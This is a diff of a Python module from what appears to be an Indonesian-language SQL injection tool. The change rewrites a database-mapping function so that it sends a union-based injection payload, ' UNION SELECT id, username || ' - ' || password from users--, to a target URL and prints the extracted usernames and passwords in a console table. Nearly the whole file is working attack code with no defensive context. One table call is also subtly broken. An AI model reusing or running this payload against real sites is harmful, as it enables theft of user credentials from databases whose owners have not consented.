@@ -1,4 +1,4 @@
-import re
+import json
 from urllib.parse import quote
 from core.client import HTTPClient
 from utils.logger import (
@@ -7,44 +7,56 @@ from utils.logger import (
     print_database_table
 )
 
+from rich.table import Table
+
+from rich.console import Console
+
+console = Console()
+
 class DatabaseMapper:
     def __init__(self, client:HTTPClient):
         self.client = client
     def dump_database(self, base_url : str):
-        log_info("Mempersiapkan payload Union-Based untuk ekstraksi data...")
-
-        payload = " ' UNION SELECT null, version()--"
-
-        #melakukan url encoding agar karakter spesial spasi atau tanda petik aman di kirim 
-        encoded_payload= quote(payload)
-
-        log_info("Mengirim payload ekstraksi ke target...")
-        res = self.client.send_payload(base_url, encoded_payload)
-
-        if not res["success"]:
-            log_error("Gagal terhubung saat mencoba melakukan ekstraksi data.")
-            return
-        response_text= res["text"]
-        log_success(
-            "Respons ekstraksi berhasil diterima. Memproses hasil analisis..."
+        console.print(
+        "\n[bold yellow][*] Memulai proses ekstraksi data (Dumping)...[/bold"
+        " yellow]"
         )
 
-        #menyiapkan data untuk dicetak ke dalam bentuk tabel konsol yang rapi
-        columns = ["Komponen Target", "Keterangan / Hasil"]
-        rows = [
-            ["Teknik Mapping", "Union-Based SQL Injection"],
-            ["Payload Terenkode", encoded_payload],
-            ["Status Eksekusi", "Berhasil Mengambil Respons Server"],
-            ["Ukuran Respons", f"{len(response_text)} Karakter HTML"],
-        ]
+        payload = " ' UNION SELECT id, username || ' - ' || password from users--"
 
-        #memanggil fungsi tabel dari logger 
-        print_database_table("Laporan Hasil Mapping Database", columns, rows)
+        #kirim payload ke target
+        response = self.client.send_payload(base_url, quote(payload))
 
-        log_info(
-            "Tips Pengembangan: Kamu bisa memperluas fungsi ini menggunakan perulangan"
-            " (looping) untuk membaca isi tabel dari information_schema."
-        )
+        if response["success"] and response["status_code"] == 200:
+            console.print(
+                "[bold green][+] Berhasil menerima respons dari"
+                " target![/bold green]"
+            )
 
+            try:
+                data = json.loads(response["text"])
+                self.display_table_data(data.get("data", []))
+            except json.JSONDecodeError:
+                console.print(
+                    "[cyan][i] Menganalisis respons teks mentah...[/cyan][/i]"
+                )
+                print(response["text"][:1000])
+        else:
+            console.print(
+                "[bold red][!] Gagal mengekstrak data dari target.[/bold red]"
+            )
 
+    def display_table_data(self, rows):
+        table = Table(title="Hasil Ekstraksi Data Database (SQLi Dump)")
+        table.add_column("ID / Kolom 1", style="cyan", no_wrap= True)
+        table.add_row("Data / Kolom 2", style="magenta")
 
+        if not rows:
+            table.add_row("Kosong", "Tidak ada data yang berhasil ditarik.")
+        else:
+            for row in rows:
+                col1 = str(row[0]) if len(row) > 0 else ""
+                col2 = str(row[1]) if len(row) > 1 else ""
+                table.add_row(col1, col2)
+
+            console.print(table)
